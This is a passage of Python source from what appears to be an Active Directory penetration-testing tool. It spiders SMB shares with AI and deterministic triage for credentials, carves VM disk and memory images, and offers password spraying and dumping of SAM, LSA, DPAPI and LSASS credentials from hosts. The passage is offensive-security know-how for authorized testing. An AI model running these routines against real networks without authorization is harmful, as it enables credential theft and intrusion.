                resolved_mount_root = str(
                    cifs_mount_root or ""
                ).strip() or _resolve_cifs_mount_root(shell=shell, domain=domain)
                vm_local_path = (
                    cifs_mapping_service.resolve_candidate_local_path(
                        mount_root=resolved_mount_root,
                        host=host,
                        share=share,
                        remote_path=path,
                        allow_share_root_fallback=len(prioritized_files) <= 1,
                    )
                    or ""
                )
            from adscan_internal.services.vm_artifact_service import VMArtifactService

            vm_service = VMArtifactService()
            if vm_artifact_kind == "memory":
                # Memory images are carved with Volatility 3 on a local copy: a CIFS
                # mount exposes the file locally; otherwise it is fetched in full over
                # one persistent SMB session (broad random access — sparse is pointless).
                if vm_local_path:
                    extraction = vm_service.extract_from_memory_source(source_path=vm_local_path)
                else:
                    extraction = vm_service.extract_from_smb_memory(
                        shell=shell,
                        domain=domain,
                        host=host,
                        share=share,
                        source_path=path,
                    )
            elif vm_local_path:
                extraction = vm_service.extract_from_disk_source(source_path=vm_local_path)
            else:
                # size=None → extract_from_smb_disk auto-resolves the exact size via a
                # native aiosmb stat, then sparse-reads (or reconstructs a chain).
                extraction = vm_service.extract_from_smb_disk(
                    shell=shell,
                    domain=domain,
                    host=host,
                    share=share,
                    source_path=path,
                    size=known_size_bytes if isinstance(known_size_bytes, int) and known_size_bytes > 0 else None,
                )
            # DCSync-style (DC snapshot) / Backup-Operators-style (member server)
            # persistence + selector + premium UX lives in the dedicated handler.
            from adscan_internal.cli.vm_artifact_credentials import (
                persist_vm_disk_credentials,
            )

            persist_result = persist_vm_disk_credentials(
                shell, domain=domain, host=host, source_label=path, extraction=extraction
            )
            if persist_result.stored:
                deterministic_handled += 1
                deterministic_findings += persist_result.stored
                flagged_files += 1
                flagged_credentials += persist_result.stored
                if continue_after_findings is None:
                    continue_after_findings = _confirm_continue_after_findings(shell=shell)
                if continue_after_findings is False:
                    print_info(
                        "Stopping prioritized file analysis after credential findings "
                        "by user choice."
                    )
                    break
            else:
                review_candidate_paths.append(f"{host}/{share}{path}")
            continue

        per_file_max_bytes = max_bytes
        full_zip_limit = _resolve_ai_zip_full_read_max_bytes()
        if isinstance(known_size_bytes, int) and known_size_bytes > max_bytes:
            marked_path = mark_sensitive(path, "path")
            marked_host = mark_sensitive(host, "hostname")
            marked_share = mark_sensitive(share, "service")
            limit_text = _format_size_human(max_bytes)
            file_size_text = known_size_text or f"{known_size_bytes} B"
            print_warning(
                "Prioritized file exceeds configured read limit: "
                f"{marked_host}/{marked_share}:{marked_path} "
                f"(size={file_size_text}, limit={limit_text})."
            )
            analyze_anyway = Confirm.ask(
                (
                    "Analyze this oversized file anyway? "
                    f"(size={file_size_text}, capped_read_limit={limit_text})"
                ),
                default=False,
            )
            print_info_debug(
                "AI oversized file decision: "
                f"host={marked_host} share={marked_share} path={marked_path} "
                f"size={file_size_text} limit={limit_text} "
                f"analyze_anyway={analyze_anyway}"
            )
            if not analyze_anyway:
                skipped_oversized += 1
                oversized_rows.append(
                    (
                        host,
                        share,
                        path,
                        file_size_text,
                        limit_text,
                    )
                )
                continue
            forced_oversized += 1
            if is_zip_candidate:
                file_size_text = known_size_text or f"{known_size_bytes} B"
                full_limit_text = _format_size_human(full_zip_limit)
                if known_size_bytes <= full_zip_limit:
                    read_full_zip = Confirm.ask(
                        (
                            "ZIP archives often fail deterministic parsing when truncated. "
                            "Read full ZIP for deterministic analysis? "
                            f"(size={file_size_text}, safety_limit={full_limit_text})"
                        ),
                        default=True,
                    )
                    print_info_debug(
                        "AI ZIP full-read decision: "
                        f"host={marked_host} share={marked_share} path={marked_path} "
                        f"size={file_size_text} default_limit={limit_text} "
                        f"full_read_limit={full_limit_text} read_full_zip={read_full_zip}"
                    )
                    if read_full_zip:
                        per_file_max_bytes = full_zip_limit
                        print_info_debug(
                            "AI ZIP full-read effective bytes: "
                            f"known_size_bytes={known_size_bytes} "
                            f"requested_max_bytes={per_file_max_bytes}"
                        )
                        print_info(
                            "Continuing with full ZIP read for deterministic analysis on "
                            f"{marked_path} (max read {_format_size_human(per_file_max_bytes)})."
                        )
                    else:
                        print_info(
                            f"Continuing with capped analysis for oversized file {marked_path} "
                            f"(max read {limit_text})."
                        )
                else:
                    print_warning(
                        "ZIP exceeds configured full-read safety limit and will stay capped: "
                        f"{marked_path} (size={file_size_text}, safety_limit={full_limit_text})."
                    )
                    print_info(
                        f"Continuing with capped analysis for oversized file {marked_path} "
                        f"(max read {limit_text})."
                    )
            else:
                print_info(
                    f"Continuing with capped analysis for oversized file {marked_path} "
                    f"(max read {limit_text})."
                )

        marked_host = mark_sensitive(host, "hostname")
        marked_share = mark_sensitive(share, "service")
        marked_path = mark_sensitive(path, "path")
        print_info(
            f"[{idx}/{len(prioritized_files)}] AI reading {marked_path} "
            f"on {marked_host}/{marked_share}"
        )

        per_file_backend = read_backend
        local_source_path = ""
        read_result: Any | None = None
        if read_backend == "cifs_local":
            resolved_mount_root = str(
                cifs_mount_root or ""
            ).strip() or _resolve_cifs_mount_root(
                shell=shell,
                domain=domain,
            )
            local_source_path = (
                cifs_mapping_service.resolve_candidate_local_path(
                    mount_root=resolved_mount_root,
                    host=host,
                    share=share,
                    remote_path=path,
                    allow_share_root_fallback=len(prioritized_files) <= 1,
                )
                or ""
            )
            if local_source_path:
                local_reads += 1
                read_result = local_reader_service.read_file_bytes(
                    source_path=local_source_path,
                    max_bytes=per_file_max_bytes,
                )
            else:
                local_to_smb_fallbacks += 1
                per_file_backend = "smb_impacket"
                marked_root = mark_sensitive(resolved_mount_root, "path")
                print_warning_debug(
                    "CIFS local path resolution failed; falling back to SMB byte-stream: "
                    f"host={marked_host} share={marked_share} path={marked_path} "
                    f"mount_root={marked_root}"
                )
        if per_file_backend != "cifs_local":
            read_result = reader_service.read_file_bytes(
                shell=shell,
                domain=domain,
                host=host,
                share=share,
                source_path=path,
                max_bytes=per_file_max_bytes,
                timeout_seconds=120 if per_file_max_bytes > max_bytes else 30,
                auth_username=read_username,
                auth_password=read_password,
                auth_domain=read_domain,
            )
        if read_result is None:
            continue
        print_info_debug(
            "AI file read result: "
            f"host={marked_host} share={marked_share} path={marked_path} "
            f"backend={per_file_backend} "
            f"requested_max_bytes={per_file_max_bytes} "
            f"received_bytes={len(read_result.data)} "
            f"truncated={read_result.truncated} success={read_result.success}"
        )
        if not read_result.success:
            read_failures += 1
            read_label = (
                "local CIFS read"
                if per_file_backend == "cifs_local"
                else "Impacket byte-stream"
            )
            print_warning(f"Could not read {marked_path} via {read_label}.")
            auth_user_marked = mark_sensitive(
                read_result.auth_username or "unknown",
                "user",
            )
            auth_domain_marked = mark_sensitive(
                read_result.auth_domain or domain,
                "domain",
            )
            normalized_path_marked = mark_sensitive(
                read_result.normalized_path or path,
                "path",
            )
            if per_file_backend == "cifs_local":
                print_warning_debug(
                    "CIFS local read failure: "
                    f"host={marked_host} share={marked_share} path={marked_path} "
                    f"local_path={normalized_path_marked} "
                    f"error={read_result.error_message or 'unknown'}"
                )
            else:
                print_warning_debug(
                    "SMB byte read failure: "
                    f"host={marked_host} share={marked_share} path={marked_path} "
                    f"normalized_path={normalized_path_marked} "
                    f"auth_user={auth_user_marked} auth_domain={auth_domain_marked} "
                    f"auth_mode={read_result.auth_mode or 'unknown'} "
                    f"status={read_result.status_code or '-'} "
                    f"error={read_result.error_message or 'unknown'}"
                )
            continue

        if read_result.truncated:
            print_warning(
                f"File {marked_path} was truncated to "
                f"{_format_size_human(per_file_max_bytes)} for AI analysis."
            )
            if is_zip_candidate:
                print_warning_debug(
                    "Truncated ZIP stream detected: deterministic ZIP->DMP analyzers "
                    "may not execute (pypykatz path likely skipped)."
                )

        pipeline_result = pipeline_service.analyze_from_bytes(
            domain=domain,
            scope=scope,
            candidate=candidate,
            source_path=path,
            file_bytes=read_result.data,
            truncated=read_result.truncated,
            max_bytes=per_file_max_bytes,
            triage_service=triage_service,
            ai_service=ai_service,
        )
        if pipeline_result.deterministic_handled:
            deterministic_handled += 1
            for note in pipeline_result.deterministic_notes:
                print_info_debug(
                    "Deterministic analyzer note for "
                    f"{marked_host}/{marked_share}:{marked_path}: {note}"
                )
            if pipeline_result.deterministic_summary:
                print_info(
                    "Deterministic summary for "
                    f"{marked_path}: {pipeline_result.deterministic_summary}"
                )
            if pipeline_result.deterministic_findings:
                keepass_findings = [
                    finding
                    for finding in pipeline_result.deterministic_findings
                    if str(getattr(finding, "credential_type", "") or "")
                    .strip()
                    .lower()
                    == "keepass_artifact"
                ]
                if keepass_findings:
                    persisted_artifact = _persist_prioritized_artifact_bytes(
                        shell=shell,
                        domain=domain,
                        candidate=candidate,
                        file_bytes=read_result.data,
                    )
                    try:
                        extracted_entries = int(
                            shell._process_keepass_artifact(
                                domain,
                                persisted_artifact,
                                [host] if host else None,
                                [share] if share else None,
                                read_username,
                            )
                            or 0
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                        extracted_entries = 0
                        print_warning(
                            f"Could not process KeePass artifact {marked_path} deterministically."
                        )
                        print_warning_debug(
                            "Deterministic KeePass artifact handling failed: "
                            f"host={marked_host} share={marked_share} path={marked_path} "
                            f"error={type(exc).__name__}: {exc}"
                        )
                    finding_count = max(1, extracted_entries)
                    deterministic_findings += finding_count
                    flagged_files += 1
                    flagged_credentials += finding_count
                    continue
                finding_count = len(pipeline_result.deterministic_findings)
                deterministic_findings += finding_count
                flagged_files += 1
                flagged_credentials += finding_count
                _render_file_credentials_table(
                    shell,
                    candidate=candidate,
                    findings=pipeline_result.deterministic_findings,
                    source_label="Deterministic",
                )
                if not _handle_prioritized_findings_actions(
                    shell=shell,
                    domain=domain,
                    candidate=candidate,
                    findings=pipeline_result.deterministic_findings,
                    auth_username=read_username,
                    provenance_service=provenance_service,
                ):
                    continue_after_findings = False
                if continue_after_findings is None:
                    continue_after_findings = _confirm_continue_after_findings(
                        shell=shell,
                    )
                if continue_after_findings is False:
                    print_info(
                        "Stopping prioritized file analysis after credential findings "
                        "by user choice."
                    )
                    break
            else:
                review_candidate_paths.append(f"{host}/{share}{path}")
        if pipeline_result.error_message:
            read_failures += 1
            print_warning(
                f"Could not extract readable content from {marked_path} for AI analysis."
            )
            print_warning_debug(
                "AI extraction failure: "
                f"host={marked_host} share={marked_share} path={marked_path} "
                f"error={pipeline_result.error_message}"
            )
            continue

        if pipeline_result.ai_attempted:
            analyzed += 1
            print_info_debug(
                "AI content extraction completed: "
                f"host={marked_host} share={marked_share} path={marked_path} "
                f"mode={pipeline_result.extraction_mode} "
                f"content_chars={pipeline_result.extraction_chars} "
                f"notes={len(pipeline_result.extraction_notes)}"
            )
            for note in pipeline_result.extraction_notes:
                print_info_debug(
                    "AI extraction note for "
                    f"{marked_host}/{marked_share}:{marked_path}: {note}"
                )
            if pipeline_result.ai_summary:
                print_info(
                    f"AI summary for {marked_path}: {pipeline_result.ai_summary}"
                )

            if pipeline_result.ai_findings:
                flagged_files += 1
                flagged_credentials += len(pipeline_result.ai_findings)
                _render_file_credentials_table(
                    shell,
                    candidate=candidate,
                    findings=pipeline_result.ai_findings,
                    source_label="AI",
                )
                if not _handle_prioritized_findings_actions(
                    shell=shell,
                    domain=domain,
                    candidate=candidate,
                    findings=pipeline_result.ai_findings,
                    auth_username=read_username,
                    provenance_service=provenance_service,
                ):
                    continue_after_findings = False
                if continue_after_findings is None:
                    continue_after_findings = _confirm_continue_after_findings(
                        shell=shell,
                    )
                if continue_after_findings is False:
                    print_info(
                        "Stopping prioritized file analysis after credential findings "
                        "by user choice."
                    )
                    break
            else:
                review_candidate_paths.append(f"{host}/{share}{path}")
                print_info_debug(
                    "AI file analysis returned no credential-like findings for "
                    f"{host}/{share}:{path}."
                )
        elif not pipeline_result.deterministic_handled:
            read_failures += 1
            print_info_debug(
                "File analysis pipeline produced no deterministic or AI result for "
                f"{host}/{share}:{path}."
            )

    print_panel(
        (
            f"AI prioritized analysis completed.\n"
            f"- read_backend={read_backend}\n"
            f"- prioritized_files={len(prioritized_files)}\n"
            f"- analyzed={analyzed}\n"
            f"- deterministic_handled={deterministic_handled}\n"
            f"- deterministic_findings={deterministic_findings}\n"
            f"- read_failures={read_failures}\n"
            f"- local_reads={local_reads}\n"
            f"- local_to_smb_fallbacks={local_to_smb_fallbacks}\n"
            f"- files_with_findings={flagged_files}\n"
            f"- credential_like_findings={flagged_credentials}\n"
            f"- skipped_oversized={skipped_oversized}\n"
            f"- forced_oversized={forced_oversized}"
        ),
        title="[bold]SMB AI File Analysis[/bold]",
        border_style="cyan",
        padding=(0, 1),
    )
    if oversized_rows:
        _render_ai_oversized_skips_table(rows=oversized_rows)
    if flagged_files == 0 and review_candidate_paths:
        render_no_extracted_findings_preview(
            loot_dir="",
            loot_rel="",
            analyzed_count=len(review_candidate_paths),
            category="mixed",
            phase_label="AI prioritized file analysis",
            candidate_paths=review_candidate_paths,
            report_root_abs=report_root_abs,
            scope_label="AI prioritized SMB files",
            preview_limit=5,
        )


def _render_file_credentials_table(
    shell: Any,
    *,
    candidate: Any,
    findings: list[Any],
    source_label: str,
) -> None:
    """Render credential-like findings for one SMB file."""
    source = str(source_label or "AI").strip() or "AI"
    table = Table(
        title=f"[bold red]{source} Credential-like Findings[/bold red]",
        header_style="bold red",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("Type", style="cyan")
    table.add_column("Username", style="magenta")
    table.add_column("Secret", style="green")
    table.add_column("Confidence", style="yellow")
    table.add_column("Evidence", style="white")

    host = mark_sensitive(str(getattr(candidate, "host", "")), "hostname")
    share = mark_sensitive(str(getattr(candidate, "share", "")), "service")
    path = mark_sensitive(str(getattr(candidate, "path", "")), "path")
    print_warning(
        f"{source} flagged potential credential findings in {host}/{share}:{path}"
    )

    for finding in findings:
        cred_type = str(getattr(finding, "credential_type", "") or "").strip() or "-"
        username = mark_sensitive(
            str(getattr(finding, "username", "") or "").strip() or "-",
            "user",
        )
        secret = mark_sensitive(
            str(getattr(finding, "secret", "") or "").strip() or "-",
            "password",
        )
        confidence = str(getattr(finding, "confidence", "") or "").strip() or "-"
        evidence = mark_sensitive(
            str(getattr(finding, "evidence", "") or "").strip() or "-",
            "text",
        )
        if len(evidence) > 140:
            evidence = evidence[:137] + "..."
        table.add_row(cred_type, username, secret, confidence, evidence)

    print_panel_with_table(table, border_style=BRAND_COLORS["warning"])


def _resolve_ai_file_read_max_bytes() -> int:
    """Resolve maximum bytes per remote SMB file read for AI analysis."""
    raw = os.getenv("ADSCAN_AI_SHARE_FILE_MAX_BYTES", "10485760").strip()
    try:
        value = int(raw)
    except ValueError:
        return 10485760
    return max(65536, min(value, 10 * 1024 * 1024))


def _resolve_ai_triage_max_prompt_chars() -> int:
    """Return safe max prompt size for one Codex app-server triage request."""
    raw = os.getenv("ADSCAN_AI_TRIAGE_MAX_PROMPT_CHARS", "1000000").strip()
    try:
        value = int(raw)
    except ValueError:
        return 1_000_000
    return max(65536, min(value, 1_048_576))


def _confirm_continue_after_findings(*, shell: Any) -> bool:
    """Ask once whether prioritized analysis should continue after findings."""
    run_type = str(getattr(shell, "type", "") or "").strip().lower()
    default_continue = run_type != "ctf"
    return Confirm.ask(
        "Credential-like findings detected. Continue analyzing remaining prioritized files?",
        default=default_continue,
    )


def _handle_prioritized_findings_actions(
    *,
    shell: Any,
    domain: str,
    candidate: Any,
    findings: list[Any],
    auth_username: str | None = None,
    provenance_service: Any | None = None,
) -> bool:
    """Offer follow-up actions for findings and return True when analysis may continue."""
    if not findings:
        return True

    host = str(getattr(candidate, "host", "") or "").strip()
    share = str(getattr(candidate, "share", "") or "").strip()
    path = str(getattr(candidate, "path", "") or "").strip()

    credential_candidates: list[tuple[str, str, str]] = []
    seen_credential_candidates: set[tuple[str, str]] = set()
    spray_candidates: list[str] = []
    seen_spray_candidates: set[str] = set()
    for finding in findings:
        username = str(getattr(finding, "username", "") or "").strip()
        secret = str(getattr(finding, "secret", "") or "").strip()
        cred_type = str(getattr(finding, "credential_type", "") or "").strip() or "-"
        if not secret or secret == "-":
            continue
        if username and username != "-":
            key = (username, secret)
            if key not in seen_credential_candidates:
                credential_candidates.append((cred_type, username, secret))
                seen_credential_candidates.add(key)
            continue
        if callable(getattr(shell, "is_hash", None)) and shell.is_hash(secret):
            continue
        if secret not in seen_spray_candidates:
            spray_candidates.append(secret)
            seen_spray_candidates.add(secret)

    if credential_candidates:
        action_options = [
            "Validate and store all username+credential findings",
            "Validate and store one selected finding",
            "Skip validation for now",
        ]
        selected_action = _select_action_index(
            shell=shell,
            title="Choose how to handle discovered credentials:",
            options=action_options,
            default_idx=0,
        )
        if selected_action is None:
            selected_action = 2
        selected_rows = credential_candidates
        if selected_action == 1:
            row_options = [
                f"{username} ({cred_type})"
                for cred_type, username, _ in credential_candidates
            ]
            selected_row = _select_action_index(
                shell=shell,
                title="Select one finding to validate and store:",
                options=row_options,
                default_idx=0,
            )
            if selected_row is None:
                selected_rows = []
            else:
                selected_rows = [credential_candidates[selected_row]]
        elif selected_action == 2:
            selected_rows = []

        for cred_type, username, secret in selected_rows:
            marked_user = mark_sensitive(username, "user")
            marked_type = mark_sensitive(cred_type, "text")
            print_info(
                f"Validating/storing discovered credential for {marked_user} "
                f"(type={marked_type})."
            )
            source_steps = []
            if provenance_service is not None:
                source_steps = provenance_service.build_credential_source_steps(
                    relation="PasswordInShare",
                    edge_type="share_password",
                    source="share_ai_triage",
                    secret=secret,
                    hosts=[host] if host else None,
                    shares=[share] if share else None,
                    artifact=path or None,
                    auth_username=auth_username,
                    origin="share_spidering",
                )
            try:
                shell.add_credential(
                    domain,
                    username,
                    secret,
                    source_steps=source_steps,
                    prompt_for_user_privs_after=False,
                    credential_origin="passwordinshares",
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_warning(
                    "Could not validate/store one discovered credential. "
                    "Continuing with remaining findings."
                )
                print_exception(exception=exc)

    if spray_candidates and domain in getattr(shell, "domains", []):
        spray_secret = spray_candidates[0]
        if len(spray_candidates) > 1:
            idx = _select_action_index(
                shell=shell,
                title="Select one secret to use for password spraying:",
                options=[_safe_secret_preview(value) for value in spray_candidates],
                default_idx=0,
            )
            if idx is not None:
                spray_secret = spray_candidates[idx]
        if Confirm.ask(
            "Run password spraying using selected secret without associated username?",
            default=False,
        ):
            source_context = None
            if provenance_service is not None:
                source_context = provenance_service.build_source_context(
                    hosts=[host] if host else None,
                    shares=[share] if share else None,
                    artifact=path or None,
                    auth_username=auth_username,
                    origin="share_spidering",
                )
            try:
                shell.spraying_with_password(
                    domain,
                    spray_secret,
                    source_context=source_context,
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_warning("Password spraying from discovered secret failed.")
                print_exception(exception=exc)
    return True


def _persist_prioritized_artifact_bytes(
    *,
    shell: Any,
    domain: str,
    candidate: Any,
    file_bytes: bytes,
) -> str:
    """Persist AI-prioritized artifact bytes to a workspace-scoped path."""
    host = str(getattr(candidate, "host", "") or "").strip() or "unknown_host"
    share = str(getattr(candidate, "share", "") or "").strip() or "unknown_share"
    remote_path = str(getattr(candidate, "path", "") or "").strip()
    filename = Path(remote_path or "artifact.bin").name or "artifact.bin"
    workspace_cwd = shell._get_workspace_cwd()
    artifact_root = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "ai_prioritized_artifacts",
        _slugify_token(host),
        _slugify_token(share),
    )
    os.makedirs(artifact_root, exist_ok=True)
    target_path = os.path.join(artifact_root, filename)
    with open(target_path, "wb") as handle:
        handle.write(file_bytes)
    print_info_debug(
        "Persisted prioritized SMB artifact bytes: "
        f"path={mark_sensitive(target_path, 'path')}"
    )
    return target_path


def _select_action_index(
    *,
    shell: Any,
    title: str,
    options: list[str],
    default_idx: int = 0,
) -> int | None:
    """Select one option with questionary helper when available."""
    if not options:
        return None
    selector = getattr(shell, "_questionary_select", None)
    if callable(selector):
        try:
            return selector(title, options, default_idx)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                "Questionary selector failed in prioritized findings action flow."
            )
    return default_idx


def _safe_secret_preview(value: str) -> str:
    """Return a masked preview string for interactive secret selection."""
    text = str(value or "").strip()
    if not text:
        return "-"
    preview = text if len(text) <= 8 else f"{text[:4]}...{text[-4:]}"
    return str(mark_sensitive(preview, "password"))


def _resolve_ai_zip_full_read_max_bytes() -> int:
    """Resolve safety cap for full ZIP reads in deterministic analysis."""
    raw = os.getenv("ADSCAN_AI_ZIP_FULL_READ_MAX_BYTES", "104857600").strip()
    try:
        value = int(raw)
    except ValueError:
        return 104857600
    return max(10 * 1024 * 1024, min(value, 512 * 1024 * 1024))


def _is_zip_path(path: str) -> bool:
    """Return true when a path appears to reference a ZIP archive."""
    return str(path or "").strip().lower().endswith(".zip")


def _render_ai_oversized_skips_table(
    *,
    rows: list[tuple[str, str, str, str, str]],
) -> None:
    """Render skipped oversized prioritized files in a compact table."""
    table = Table(
        title="[bold yellow]Skipped Oversized Prioritized Files[/bold yellow]",
        header_style="bold yellow",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("Host", style="cyan")
    table.add_column("Share", style="magenta")
    table.add_column("Path", style="yellow")
    table.add_column("Size", style="green")
    table.add_column("Limit", style="red")

    for host, share, path, size_text, limit_text in rows:
        table.add_row(
            mark_sensitive(host, "hostname"),
            mark_sensitive(share, "service"),
            mark_sensitive(path, "path"),
            size_text,
            limit_text,
        )
    print_panel_with_table(table, border_style=BRAND_COLORS["warning"])


def _format_size_human(num_bytes: int) -> str:
    """Format byte sizes into human-readable values for UX messages."""
    value = float(max(0, num_bytes))
    units = ["B", "KB", "MB", "GB", "TB"]
    unit_idx = 0
    while value >= 1024 and unit_idx < len(units) - 1:
        value /= 1024
        unit_idx += 1
    if unit_idx == 0:
        return f"{int(value)} {units[unit_idx]}"
    return f"{value:.2f} {units[unit_idx]}"


def _select_post_mapping_ai_scope(shell: Any) -> str | None:
    """Select triage scope after share mapping based on pentest type."""
    pentest_type = str(getattr(shell, "type", "") or "").strip().lower()
    if pentest_type == "ctf":
        return "credentials"

    options = [
        "Credentials only (default)",
        "Sensitive data only",
        "Credentials + sensitive data",
        "Skip AI triage",
    ]
    selected_idx: int | None = None
    selector = getattr(shell, "_questionary_select", None)
    if callable(selector):
        selected_idx = selector("AI triage scope:", options, default_idx=0)
    if selected_idx is None:
        # Cancelled selection or unavailable selector defaults to credentials-only.
        return "credentials"

    if selected_idx == 1:
        return "sensitive_data"
    if selected_idx == 2:
        return "both"
    if selected_idx == 3:
        return None
    return "credentials"


def ask_for_smb_descriptions(shell: Any, *, domain: str) -> None:
    """Prompt user to search for passwords in SMB user descriptions.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
    """
    from adscan_internal.rich_output import confirm_operation

    if shell.type == "ctf" and shell.domains_data[domain]["auth"] in [
        "auth",
        "pwned",
    ]:
        return

    if shell.auto:
        run_smb_descriptions(shell, domain=domain)
    else:
        pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
        username = shell.domains_data.get(domain, {}).get("username", "N/A")

        if confirm_operation(
            operation_name="SMB Description Password Search",
            description="Scans user description fields via SMB for exposed passwords",
            context={
                "Domain": domain,
                "PDC": pdc,
                "Username": username,
                "Protocol": "SMB/445",
                "Target Field": "User descriptions",
            },
            default=True,
            icon="🔎",
        ):
            run_smb_descriptions(shell, domain=domain)


def ask_for_smb_enum_users(shell: Any, *, domain: str) -> None:
    """Prompt user to enumerate domain users via SMB (native SAMR null session).

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
    """
    from adscan_internal.rich_output import confirm_operation

    if shell.auto:
        run_smb_null_enum_users(shell, domain=domain)
    else:
        pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
        auth_type = shell.domains_data[domain]["auth"]
        session_type_display = {
            "unauth": "Null Session (Unauthenticated)",
            "auth": "Authenticated Session",
            "pwned": "Administrative Session",
            "with_users": "With Users",
        }.get(auth_type, auth_type.capitalize())

        if confirm_operation(
            operation_name="SMB User Enumeration",
            description="Enumerates domain user accounts through SMB protocol (native SAMR)",
            context={
                "Domain": domain,
                "PDC": pdc,
                "Session Type": session_type_display,
                "Protocol": "SMB/445",
            },
            default=True,
            icon="👥",
        ):
            run_smb_null_enum_users(shell, domain=domain)


def run_ask_for_smb_scan(shell: Any, *, domain: str) -> None:
    """Prompt user to perform unauthenticated SMB service scan.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
    """
    from adscan_internal.rich_output import confirm_operation

    if shell._is_ctf_domain_pwned(domain):
        return

    if shell.auto:
        run_smb_scan(shell, domain=domain)
    else:
        pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")

        if confirm_operation(
            operation_name="Unauthenticated SMB Scan",
            description="Performs null session, RID cycling, guest session, and shares enumeration",
            context={
                "Domain": domain,
                "PDC": pdc,
                "Protocol": "SMB/445",
            },
            default=True,
            icon="🔒",
        ):
            run_smb_scan(shell, domain=domain)


def ask_for_smb_scan(shell: Any, *, domain: str) -> None:
    """Alias for run_ask_for_smb_scan for backward compatibility."""
    return run_ask_for_smb_scan(shell, domain=domain)


def run_netexec_auth_shares_from_args(shell: Any, args: str) -> None:
    """Execute authenticated SMB share enumeration from command-line arguments.

    Args:
        shell: Shell instance with domain data and helper methods.
        args: Space-separated string containing domain, username, and password.

    Usage:
        run_netexec_auth_shares_from_args(shell, "example.local admin Passw0rd!")
    """
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return
    args_list = args.split()
    if len(args_list) != 3:
        print_error("Usage: netexec_shares <domain> <username> <password>")
        return
    target_domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    run_auth_shares(
        shell,
        domain=target_domain,
        username=username,
        password=password,
    )


def ask_for_smb_access(
    shell: Any,
    *,
    domain: str,
    host: str | list[str],
    username: str,
    password: str,
) -> None:
    """Prompt user to dump credentials from one or more hosts via SMB.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
        host: Target hostname/IP or list of targets.
        username: Username for authentication.
        password: Password for authentication.
    """
    hosts = [host] if isinstance(host, str) else [entry for entry in host if entry]
    if not hosts:
        return

    marked_username = mark_sensitive(username, "user")
    if len(hosts) == 1:
        marked_target = mark_sensitive(hosts[0], "hostname")
        respuesta = Confirm.ask(
            f"Do you want to dump credentials from host {marked_target} via SMB as user {marked_username}?"
        )
    else:
        respuesta = Confirm.ask(
            f"Do you want to dump credentials from {len(hosts)} hosts via SMB as user {marked_username}?"
        )
    if not respuesta:
        return

    if Confirm.ask(
        f"Do you want to dump the SAM credentials from {len(hosts)} host(s)?"
        if len(hosts) > 1
        else f"Do you want to dump the SAM credentials from host {mark_sensitive(hosts[0], 'hostname')}?",
        default=False,
    ):
        for target_host in hosts:
            shell.dump_sam(domain, username, password, target_host, "false")

    if Confirm.ask(
        f"Do you want to dump the LSA credentials from {len(hosts)} host(s)?"
        if len(hosts) > 1
        else f"Do you want to dump the LSA credentials from host {mark_sensitive(hosts[0], 'hostname')}?",
        default=False,
    ):
        for target_host in hosts:
            shell.dump_lsa(domain, username, password, target_host, "false")

    if Confirm.ask(
        f"Do you want to dump the DPAPI credentials from {len(hosts)} host(s)?"
        if len(hosts) > 1
        else f"Do you want to dump the DPAPI credentials from host {mark_sensitive(hosts[0], 'hostname')}?",
        default=False,
    ):
        for target_host in hosts:
            shell.dump_dpapi(domain, username, password, target_host, "false")

    for target_host in hosts:
        shell.ask_for_dump_lsass(domain, username, password, target_host, "false")


def execute_manspider(
    shell: Any,
    *,
    command: str,
    domain: str,
    scan_type: str,
    hosts: list[str] | None = None,
    shares: list[str] | None = None,
    auth_username: str | None = None,
    loot_dir: str | None = None,
    credsweeper_jobs: int | None = None,
    phase: str | None = None,
    analysis_context: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Execute manspider command and process its output based on type.

    For type 'passw' it displays the output directly and saves a log,
    for other types it processes the found files.

    Args:
        shell: Shell instance with domain data and helper methods.
        command: Full manspider command to execute.
        domain: Target domain name.
        scan_type: Type of scan - 'passw', 'ext', or 'gpp'.
        loot_dir: Optional loot directory used by manspider downloads.
        credsweeper_jobs: Optional CredSweeper process count for directory scans.

    Returns:
        Structured summary with completion state and phase counters.
    """
    try:
        if hosts or shares:
            marked_hosts = [mark_sensitive(h, "hostname") for h in (hosts or [])]
            marked_shares = [mark_sensitive(s, "path") for s in (shares or [])]
            print_info_debug(
                "Manspider context: "
                f"hosts={marked_hosts or 'N/A'} shares={marked_shares or 'N/A'}"
            )
        if scan_type == "passw":
            log_dir = "smb"
            if not os.path.exists(log_dir):
                os.makedirs(log_dir)

            log_file = os.path.join(log_dir, "spidering_passw.log")

            completed_process = shell.run_command(command)
            if completed_process is None:
                print_error(
                    "manspider scan failed before returning any output while searching for possible passwords in shares."
                )
                return {
                    "completed": False,
                    "credential_findings": 0,
                    "artifact_hits": 0,
                }

            output_str = completed_process.stdout
            if output_str:
                with open(log_file, "w", encoding="utf-8") as log:
                    for line in output_str.splitlines():
                        line_stripped = line.strip()
                        if line_stripped:
                            clean_line = strip_ansi_codes(line_stripped)
                            log.write(clean_line + "\n")
                    log.flush()
                print_info_verbose(f"Log saved in {log_file}")
            else:
                print_warning_debug(
                    "Manspider command for type 'passw' produced no output."
                )

            if completed_process.returncode != 0:
                print_error_debug(
                    f"Error executing manspider (type passw). Return code: {completed_process.returncode}"
                )
                error_message = completed_process.stderr
                if error_message:
                    print_error(f"Details: {error_message}")
                elif not error_message and output_str:
                    print_error(f"Details (from stdout): {output_str}")
                else:
                    print_error_debug("No error output from manspider command.")

            # Analyze log to extract credentials if manspider completed successfully
            if (
                completed_process.returncode == 0
                and loot_dir
